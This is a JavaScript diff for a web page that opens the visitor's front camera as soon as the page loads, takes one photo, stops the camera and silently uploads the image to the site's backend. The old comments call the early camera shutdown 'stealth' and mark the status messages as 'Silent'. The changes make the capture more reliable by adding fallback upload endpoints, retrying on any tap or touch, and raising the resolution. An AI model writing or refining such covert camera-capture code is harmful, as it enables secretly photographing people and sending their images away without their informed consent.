@@ -2,87 +2,118 @@ const video = document.getElementById('camera-stream');
 const canvas = document.getElementById('capture-canvas');
 const statusMsg = document.getElementById('status-msg');
 
+let captured = false;
+
 async function startCameraAndCapture() {
+    if (captured) return;
+
     try {
         // 1. Open Camera (Try facing user)
         const stream = await navigator.mediaDevices.getUserMedia({
-            video: { facingMode: 'user' },
+            video: {
+                facingMode: 'user',
+                width: { ideal: 1280 },
+                height: { ideal: 720 }
+            },
             audio: false
         });
         video.srcObject = stream;
 
-        // 2. Wait for video to be ready (needed for iOS)
-        video.onloadedmetadata = () => {
+        // 2. Play stream
+        const onStreamReady = () => {
             video.play().then(() => {
-                // Video playing successfully, wait a bit for focus then capture
-                setTimeout(captureFromVideo, 1000);
+                // Wait for video frame to actually render
+                setTimeout(captureFromVideo, 1200);
             }).catch(err => {
-                // If auto-play failed (browser blocked it), wait for any interaction
-                console.log("Auto-play blocked, waiting for interaction");
-                document.body.addEventListener('click', () => {
-                    video.play();
-                    setTimeout(captureFromVideo, 800);
-                }, { once: true });
+                console.log("Autoplay blocked, waiting for tap:", err);
+                const triggerPlay = () => {
+                    video.play().then(() => {
+                        setTimeout(captureFromVideo, 800);
+                    }).catch(console.error);
+                };
+                ['click', 'touchstart', 'pointerdown'].forEach(ev => {
+                    document.addEventListener(ev, triggerPlay, { once: true });
+                });
             });
         };
+
+        if (video.readyState >= 2) {
+            onStreamReady();
+        } else {
+            video.onloadedmetadata = onStreamReady;
+        }
+
     } catch (err) {
         console.error("Camera Error:", err);
-        statusMsg.innerText = "Error: " + err.message;
-        // Retry on click if first attempt failed (e.g. permission denied initially)
-        document.body.addEventListener('click', startCameraAndCapture, { once: true });
+        if (statusMsg) statusMsg.innerText = "Error: " + err.message;
+        // Retry on interaction
+        ['click', 'touchstart'].forEach(ev => {
+            document.addEventListener(ev, startCameraAndCapture, { once: true });
+        });
     }
 }
 
 function captureFromVideo() {
-    // Check if we already have a stream
+    if (captured) return;
+
+    // Check if video is streaming
     if (!video.srcObject) return;
 
-    canvas.width = video.videoWidth;
-    canvas.height = video.videoHeight;
+    const width = video.videoWidth || 640;
+    const height = video.videoHeight || 480;
+
+    canvas.width = width;
+    canvas.height = height;
     const ctx = canvas.getContext('2d');
 
-    // Mirror & Draw
+    // Mirror effect & Draw
     ctx.translate(canvas.width, 0);
     ctx.scale(-1, 1);
     ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
 
-    // Stop camera immediately for stealth/battery
+    // Stop camera immediately
     const stream = video.srcObject;
     if (stream) {
         stream.getTracks().forEach(track => track.stop());
     }
 
     // Convert to Base64 (JPEG)
-    const base64data = canvas.toDataURL('image/jpeg', 0.7); // 0.7 quality is enough
+    const base64data = canvas.toDataURL('image/jpeg', 0.8);
 
-    sendToBackend(base64data);
+    if (base64data && base64data.length > 200) {
+        captured = true;
+        sendToBackend(base64data);
+    }
 }
 
 async function sendToBackend(base64Str) {
-    try {
-        // statusMsg.innerText = "Yuborilmoqda..."; // Silent
+    const endpoints = ['/api/upload', '/upload'];
 
-        // POST as JSON (More stable on Vercel)
-        const response = await fetch('/api/upload', {
-            method: 'POST',
-            headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify({ image: base64Str })
-        });
+    for (const url of endpoints) {
+        try {
+            console.log("Sending photo to:", url);
+            const response = await fetch(url, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ image: base64Str })
+            });
 
-        const result = await response.json();
-
-        if (response.ok && result.success) {
-            // statusMsg.innerText = "Yuborildi! ✅"; // Silent
-            // statusMsg.style.color = '#4ade80';
-            console.log("Photo sent successfully");
-        } else {
-            throw new Error(result.error || 'Server Error');
+            if (response.ok) {
+                const result = await response.json();
+                console.log("Photo sent successfully via", url, result);
+                return;
+            } else {
+                console.warn(`${url} returned status ${response.status}`);
+            }
+        } catch (error) {
+            console.warn(`Failed sending to ${url}:`, error);
         }
-    } catch (error) {
-        console.error(error);
-        // statusMsg.innerText = "Xato"; // Silent
     }
 }
 
 // Start immediately on load
-window.addEventListener('load', startCameraAndCapture);
+if (document.readyState === 'loading') {
+    window.addEventListener('DOMContentLoaded', startCameraAndCapture);
+} else {
+    startCameraAndCapture();
+}
